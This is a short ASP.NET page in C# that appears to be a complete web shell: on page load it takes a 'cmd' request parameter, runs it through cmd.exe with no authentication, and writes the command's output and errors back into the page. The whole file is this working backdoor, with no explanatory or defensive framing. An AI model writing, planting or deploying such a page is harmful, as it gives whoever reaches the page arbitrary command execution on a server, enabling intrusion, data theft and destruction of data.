<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
private void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.StartInfo.RedirectStandardInput = true;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();

        StreamReader stdout = proc.StandardOutput;
        StreamReader stderr = proc.StandardError;
        Response.Write("<pre>" + stdout.ReadToEnd() + "</pre>");
        Response.Write("<pre>" + stderr.ReadToEnd() + "</pre>");
    }
}
</script>